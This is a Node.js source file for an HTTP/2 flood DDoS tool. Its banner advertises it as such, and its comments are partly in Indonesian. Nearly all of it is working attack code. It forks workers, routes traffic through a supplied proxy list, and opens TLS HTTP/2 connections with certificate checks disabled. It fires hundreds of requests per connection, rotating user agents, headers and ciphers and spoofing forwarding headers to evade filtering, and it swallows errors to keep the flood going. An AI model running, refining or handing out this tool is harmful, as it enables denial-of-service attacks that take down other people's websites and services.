const url = require('url');
const fs = require('fs');
const http2 = require("http2");
const http = require('http');
const tls = require('tls');
const cluster = require("cluster");
const fakeua = require("fake-useragent");

// ==================== KONFIGURASI ====================
const config = {
  ciphers: [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", 
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK'
  ],
  acceptHeaders: [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8", 
    "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*",
    "text/html, application/xhtml+xml, image/jxr, */*",
    "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1",
    "application/javascript, */*;q=0.8",
    "text/html, text/plain; q=0.6, */*; q=0.1",
    "application/graphql, application/json; q=0.8, application/xml; q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
  ],
  langHeaders: [
    "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", 
    "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
    "en-US,en;q=0.5",
    "en-US,en;q=0.9",
    'de-CH;q=0.7', 
    "da, en-gb;q=0.8, en;q=0.7",
    "cs;q=0.5"
  ],
  encodingHeaders: [
    "gzip, deflate", 
    "br;q=1.0, gzip;q=0.8, *;q=0.1",
    "gzip",
    "gzip, compress", 
    "compress, deflate",
    "compress",
    "gzip, deflate, br", 
    "deflate"
  ],
  controlHeaders: [
    'max-age=604800',
    'no-cache', 
    'no-store',
    'no-transform',
    "only-if-cached",
    'max-age=0',
    "no-cache, no-store,private, max-age=0, must-revalidate", 
    "no-cache, no-store,private, s-maxage=604800, must-revalidate",
    "no-cache, no-store,private, max-age=604800, must-revalidate"
  ]
};

const ignoreNames = ["RequestError", "StatusCodeError", "CaptchaError", "CloudflareError", "ParseError", "ParserError"];
const ignoreCodes = ["SELF_SIGNED_CERT_IN_CHAIN", 'ECONNRESET', "ERR_ASSERTION", "ECONNREFUSED", "EPIPE", "EHOSTUNREACH", "ETIMEDOUT", "ESOCKETTIMEDOUT", 'EPROTO'];

// ==================== ART DAN BANNER ====================
const BANNER = `
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⠀⠀⣤⣦⣤⣄⡀⢸⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⠉⠁⠀⠀⠀⢷⡙⠀⠈⠉⢻⠀⡇⠀⠀⠀⠀⠀⢀⣤⠶⠛⠛⠓⠊⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⣿⠚⠀⢠⡄⠀⠀⠈⢷⢀⠀⠀⡏⡇⢯⠁⢦⣀⣴⠞⠋⠀⣠⡄⠀⠀⢸⠛⠀⠀⠀⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠀⠀⠀⠙⢦⣄⠀⠈⠳⡀⢰⢷⣷⣸⠦⠟⠛⠢⣠⣠⡶⠋⠀⠀⣠⠏⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢫⣓⢦⡀⢙⡮⣾⣿⣇⢧⠀⣀⡴⣺⠿⣄⠀⡀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⣲⣭⣉⣜⠏⠀⠹⢊⣍⣽⣷⠏⠀⠀⣲⣿⣅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⠄⣴⣷⠋⠀⠀⠀⠀⠀⠀⠈⠹⣞⠦⠀⠐⣃⡟⠠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠠⠤⠤⠤⠶⠶⠶⠶⣖⣚⣒⣋⣉⡩⠭⠴⢶⣶⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢙⣿⣷⡶⠶⠭⣍⣙⣜⣒⣓⣒⠶⠶⠶⠶⠤⠤⠤⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠙⠚⠂⠮⣷⡀⡀⠀⠀⠀⠀⠀⢀⣤⣿⠷⢔⠚⠋⠉⠉⠁⠈⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠃⠀⠀⣰⣻⣿⣿⢃⣄⠀⣰⣼⣟⠿⡼⣄⠈⠒⢄⡀⠀⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠁⠀⠀⡴⣱⠟⠋⠉⠿⢿⣻⡟⠟⠏⠙⠦⣜⣆⠀⠀⠈⠓⠦⢄⣤⣾⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡟⠀⠀⢀⡾⠛⠁⠀⠀⡠⠾⡞⣿⢰⠀⠀⠀⠀⠈⠛⢧⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠀⠀⠘⠏⠀⠀⣠⠔⠋⠀⠈⡇⠃⡾⠆⠀⠀⠀⠀⠀⠀⠙⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⣌⠂⠀⣀⡠⠔⠋⠀⠀⠀⠀⠀⢱⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⢸⢠⢷⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢸⡉⠀⠀⠀⠶⡷⠗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠷⠀⠀⠟⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

🚀 HTTP/2 FLOOD DDOS TOOLS - OPTIMIZED VERSION
📧 Contact: https://dazenc2.my.id/
`;

// ==================== OPTIMALISASI HELPER ====================
const getRandom = (array) => array[Math.floor(Math.random() * array.length)];

// Connection Agent yang Dioptimalkan
const optimizedAgent = new http.Agent({
  keepAlive: true,
  keepAliveMsecs: 30000,
  maxSockets: 100,
  maxFreeSockets: 10
});

// ==================== STATISTICS MONITORING ====================
const stats = {
  requestsSent: 0,
  errors: 0,
  startTime: Date.now(),
  workers: 0
};

// Update statistics setiap 5 detik
setInterval(() => {
  const uptime = (Date.now() - stats.startTime) / 1000;
  const rps = stats.requestsSent / uptime;
  if (cluster.isMaster) {
    console.log(`\x1b[36m📊 STATS | RPS: ${rps.toFixed(2)} | Errors: ${stats.errors} | Workers: ${stats.workers}\x1b[0m`);
  }
}, 5000);

// ==================== ERROR HANDLING ====================
process.on('uncaughtException', function (err) {
  if (err.code && ignoreCodes.includes(err.code) || err.name && ignoreNames.includes(err.name)) {
    stats.errors++;
    return false;
  }
}).on('unhandledRejection', function (err) {
  if (err.code && ignoreCodes.includes(err.code) || err.name && ignoreNames.includes(err.name)) {
    stats.errors++;
    return false;
  }
}).on("warning", warning => {
  if (warning.code && ignoreCodes.includes(warning.code) || warning.name && ignoreNames.includes(warning.name)) {
    stats.errors++;
    return false;
  }
}).setMaxListeners(0);

// ==================== ATTACK CONTROLLER ====================
class AttackController {
  constructor(requestsPerSecond = 50) {
    this.rps = requestsPerSecond;
    this.interval = 1000 / requestsPerSecond;
    this.lastRequest = 0;
    this.isActive = true;
  }

  async throttle() {
    if (!this.isActive) return;
    
    const now = Date.now();
    const waitTime = this.lastRequest + this.interval - now;
    
    if (waitTime > 0) {
      await new Promise(resolve => setTimeout(resolve, waitTime));
    }
    
    this.lastRequest = Date.now();
  }

  stop() {
    this.isActive = false;
  }
}

// ==================== FLOOD FUNCTION OPTIMIZED ====================
function optimizedFlood() {
  const targetUrl = url.parse(target);
  const userAgent = fakeua();
  const selectedCipher = getRandom(config.ciphers);
  const proxy = getRandom(proxys).split(':');
  
  const headers = {
    ':path': targetUrl.path,
    'X-Forwarded-For': proxy[0],
    'X-Forwarded-Host': proxy[0],
    ':method': "GET",
    'User-agent': userAgent,
    'Origin': target,
    'Accept': getRandom(config.acceptHeaders),
    'Accept-Encoding': getRandom(config.encodingHeaders),
    'Accept-Language': getRandom(config.langHeaders),
    'Cache-Control': getRandom(config.controlHeaders)
  };

  const proxyRequest = http.request({
    'host': proxy[0],
    'agent': optimizedAgent,
    'globalAgent': optimizedAgent,
    'port': proxy[1],
    'headers': {
      'Host': targetUrl.host,
      'Proxy-Connection': "Keep-Alive",
      'Connection': "Keep-Alive"
    },
    'method': 'CONNECT',
    'path': targetUrl.host + ":443"
  }, function () {
    proxyRequest.setSocketKeepAlive(true);
  });

  proxyRequest.on("connect", function (response, socket, head) {
    const http2Connection = http2.connect(targetUrl.href, {
      'createConnection': () => tls.connect({
        'host': targetUrl.host,
        'ciphers': selectedCipher,
        'secureProtocol': 'TLS_method',
        'TLS_MIN_VERSION': "1.2",
        'TLS_MAX_VERSION': "1.3",
        'servername': targetUrl.host,
        'secure': true,
        'rejectUnauthorized': false,
        'ALPNProtocols': ['h2'],
        'socket': socket
      }, function () {
        // Mengirim 200 request per connection (optimized)
        for (let i = 0; i < 200; i++) {
          const request = http2Connection.request(headers);
          request.setEncoding("utf8");
          request.on("data", () => {});
          request.on("response", () => {
            stats.requestsSent++;
            request.close();
          });
          request.on("error", () => stats.errors++);
          request.end();
        }
      })
    });

    http2Connection.on('error', () => stats.errors++);
  });

  proxyRequest.on('error', () => stats.errors++);
  proxyRequest.end();
}

// ==================== FLOOD WITH RETRY MECHANISM ====================
function floodWithRetry(maxRetries = 3) {
  let retries = 0;
  
  function attempt() {
    try {
      optimizedFlood();
    } catch (err) {
      if (retries < maxRetries) {
        retries++;
        setTimeout(attempt, 1000 * retries);
      } else {
        stats.errors++;
      }
    }
  }
  
  attempt();
}

// ==================== MAIN EXECUTION ====================
const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxys = fs.readFileSync(process.argv[5], "utf-8").toString().match(/\S+/g);

if (cluster.isMaster) {
  console.log(BANNER);
  console.log("\x1B[36m🎯 TARGET: \x1B[37m" + url.parse(target).host + 
              "\n\x1B[36m🧵 THREADS: \x1B[37m" + thread + 
              "\n\x1B[36m⏰ DURATION: \x1B[37m" + time + "s" +
              "\n\x1B[36m🔄 PROXIES: \x1B[37m" + proxys.length +
              "\n\x1B[32m🚀 Attack Successfully Started!\x1B[0m");
  
  stats.workers = thread;
  
  for (let i = 0; i < thread; i++) {
    cluster.fork();
  }
  
  // Auto stop setelah waktu tertentu
  setTimeout(() => {
    console.log("\x1B[31m🛑 Attack Finished After " + time + " Seconds\x1B[0m");
    process.exit(0);
  }, time * 1000);
  
} else {
  // Worker process - menjalankan attack dengan controller
  const controller = new AttackController(50); // 50 requests per second
  
  const attackInterval = setInterval(() => {
    floodWithRetry();
  }, 20); // Optimized interval
  
  // Cleanup worker
  process.on('SIGTERM', () => {
    controller.stop();
    clearInterval(attackInterval);
    process.exit(0);
  });
}
